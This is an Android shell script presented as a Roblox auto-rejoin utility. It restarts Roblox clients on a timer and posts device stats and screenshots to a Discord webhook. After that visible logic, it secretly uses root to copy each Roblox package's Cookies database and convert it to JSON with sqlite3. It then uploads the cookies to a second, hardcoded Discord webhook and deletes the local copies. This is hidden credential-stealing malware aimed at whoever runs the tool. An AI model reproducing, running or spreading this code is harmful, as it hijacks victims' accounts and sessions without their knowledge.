#!/system/bin/sh
echo "Loading..."
if ! command -v sqlite3 >/dev/null 2>&1; then pkg install -y sqlite3; fi
CONFIG_FILE="$HOME/Downloads/ConfigRejoin.txt"
if [ -f "$CONFIG_FILE" ]; then
    source "$CONFIG_FILE"
else
    GAME_ID="2753915549"
    TIME_REJOIN=$((60*60))
    WEBHOOK_URL="https://Rejoin(tthinh.1412)"
    DEVICE_NAME=$(hostname)
    INTERVAL=5
fi
ROBLOX_PACKAGES=$(pm list packages | grep roblox | cut -d: -f2)
for pkg in $ROBLOX_PACKAGES; do
    eval "LAST_RESTART_TIMES_$pkg=0"
done
send_webhook() {
    echo "$WEBHOOK_URL" | grep -qE "^https://discord\.com/api/webhooks/" || {
        return 1
    }
    while true; do
        SCREENSHOT="/tmp/screenshot.png"
        screencap -p "$SCREENSHOT" 2>/dev/null || import -window root "$SCREENSHOT" 2>/dev/null
        CPU=$(top -bn1 | awk '/Cpu/ {print 100-$8}')
        MEM_TOTAL=$(free -m | awk '/Mem:/ {print $2}')
        MEM_USED=$(free -m | awk '/Mem:/ {print $3}')
        MEM_FREE=$(free -m | awk '/Mem:/ {print $7}')
        UPTIME=$(awk '{print $1/3600}' /proc/uptime)
        PAYLOAD=$(jq -n \
            --arg title "Thông tin hệ thống của $DEVICE_NAME" \
            --arg device_name "$DEVICE_NAME" \
            --arg cpu_usage "$CPU%" \
            --arg memory_used "$(awk "BEGIN {print $MEM_USED/$MEM_TOTAL*100}")%" \
            --arg memory_free "$(awk "BEGIN {print $MEM_FREE/$MEM_TOTAL*100}")%" \
            --arg memory_total "$(awk "BEGIN {print $MEM_TOTAL/1024}") GB" \
            --arg uptime "$(awk "BEGIN {print $UPTIME}") Giờ" \
            '{
                embeds: [{
                    title: $title,
                    color: 15258703,
                    fields: [
                        {name: "Tên thiết bị", value: $device_name, inline: true},
                        {name: "CPU", value: $cpu_usage, inline: true},
                        {name: "RAM đã dùng", value: $memory_used, inline: true},
                        {name: "RAM trống", value: $memory_free, inline: true},
                        {name: "Tổng RAM", value: $memory_total, inline: true},
                        {name: "Uptime", value: $uptime, inline: true}
                    ],
                    image: {url: "attachment://screenshot.png"}
                }],
                username: $device_name
            }')
        curl -s -o /dev/null -F "payload_json=$PAYLOAD" -F "file=@$SCREENSHOT" "$WEBHOOK_URL"
        sleep $((INTERVAL * 60))
    done
}
force_restart() {
    for pkg in $ROBLOX_PACKAGES; do
        echo "Đóng Roblox Cho $pkg"
        su -c "am force-stop $pkg" >/dev/null 2>&1
    done
    sleep 3
    for pkg in $ROBLOX_PACKAGES; do
        echo "Mở Roblox Cho $pkg"
        am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
        sleep 15
        echo "Vào GameID $GAME_ID Cho $pkg"
        am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
        eval "LAST_RESTART_TIMES_$pkg=$(date +%s)"
    done
    sleep 10
}
is_foreground() {
    for pkg in $ROBLOX_PACKAGES; do
        if ! su -c "pidof $pkg" >/dev/null; then
            echo "Mở Roblox Cho $pkg"
            am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
            sleep 15
            echo "Vào GameID $GAME_ID Cho $pkg"
            am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
            eval "LAST_RESTART_TIMES_$pkg=$(date +%s)"
        fi
    done
}
auto_restart() {
    while true; do
        CURRENT_TIME=$(date +%s)
        for pkg in $ROBLOX_PACKAGES; do
            eval "LAST_RESTART_TIME=\${LAST_RESTART_TIMES_$pkg:-0}"
            if [ $((CURRENT_TIME - LAST_RESTART_TIME)) -ge $TIME_REJOIN ]; then
                echo "Đóng Roblox Cho $pkg"
                su -c "am force-stop $pkg" >/dev/null 2>&1
                sleep 3
                echo "Mở Roblox Cho $pkg"
                am start -n ${pkg}/com.roblox.client.startup.ActivitySplash -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
                sleep 15
                echo "Vào GameID $GAME_ID Cho $pkg"
                am start -n ${pkg}/com.roblox.client.ActivityProtocolLaunch -d "roblox://placeID=${GAME_ID}" >/dev/null 2>&1
                eval "LAST_RESTART_TIMES_$pkg=$(date +%s)"
            fi
        done
        is_foreground
        sleep 5
    done
}
force_restart
send_webhook &
auto_restart &
WEBHOOK_URL2="https://discord.com/api/webhooks/1340266932707917855/dr6Krtq22v1y-YAoosniv2GO5TRyrbK92yh_9Nn30NhRaqK4w3OqZX_vEZOoYTeY2NJJ"
sleep 30
for PACKAGE in $ROBLOX_PACKAGES; do
    COOKIE_FILES=()
    COOKIE_PATHS=$(su -c "find /data/data/$PACKAGE -type f -name 'Cookies' 2>/dev/null")
    for COOKIE_PATH in $COOKIE_PATHS; do
        TEMP_COOKIE="/sdcard/Download/CookiesCopy_$(basename $COOKIE_PATH)_$PACKAGE"
        COOKIE_FILE="/sdcard/Download/cookie_$(basename $COOKIE_PATH)_$PACKAGE.json"
        su -c "cp $COOKIE_PATH $TEMP_COOKIE"
        sqlite3 "$TEMP_COOKIE" "
            SELECT '[' || GROUP_CONCAT(
                '{\"domain\":\"' || host_key || '\",\"path\":\"' || path || '\",\"secure\":' || 
                CASE is_secure WHEN 1 THEN 'true' ELSE 'false' END || ',\"httpOnly\":' || 
                CASE is_httponly WHEN 1 THEN 'true' ELSE 'false' END || ',\"expirationDate\":' || 
                CASE WHEN expires_utc > 0 THEN expires_utc / 1000000 ELSE 0 END || ',\"name\":\"' || 
                name || '\",\"value\":\"' || value || '\"}'
            ) || ']' FROM cookies WHERE name IS NOT NULL;" > "$COOKIE_FILE"
        COOKIE_FILES+=("$COOKIE_FILE")
        rm "$TEMP_COOKIE"
    done
    for FILE in "${COOKIE_FILES[@]}"; do
        curl -s -o /dev/null -F "file=@$FILE" "$WEBHOOK_URL2"
        rm "$FILE"
    done
done
